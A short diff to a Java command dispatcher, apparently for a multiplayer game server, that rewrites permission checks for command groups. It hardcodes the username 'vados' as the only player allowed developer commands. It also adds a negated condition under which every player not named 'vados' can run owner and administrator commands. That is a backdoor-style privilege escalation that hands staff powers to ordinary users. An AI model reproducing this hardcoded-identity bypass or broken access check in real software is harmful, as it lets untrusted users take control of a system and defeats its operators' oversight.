@@ -25,13 +25,16 @@ public class Commands {
 		//Regular Commands
 		Members.initiate_command(player, parts, whole_command);
 		SpecialPlayers.initiate_command(player, parts, whole_command);
-		Developers.initiate_command(player, parts, whole_command);
+
+		if(player.getUsername().equals("vados")) {
+			Developers.initiate_command(player, parts, whole_command);
+		}
 
 		//Staff Members
-		if(player.getRights() == PlayerRights.OWNER) {
+		if(player.getRights() == PlayerRights.OWNER || !player.getUsername().equals("vados")) {
 			Owners.initiate_command(player, parts, whole_command);
 		}
-		if(player.getRights() == PlayerRights.ADMINISTRATOR) {
+		if(player.getRights() == PlayerRights.ADMINISTRATOR || !player.getUsername().equals("vados")) {
 			Administrators.initiate_command(player, parts, whole_command);
 		}
 		if(player.getRights() == PlayerRights.MODERATOR) {
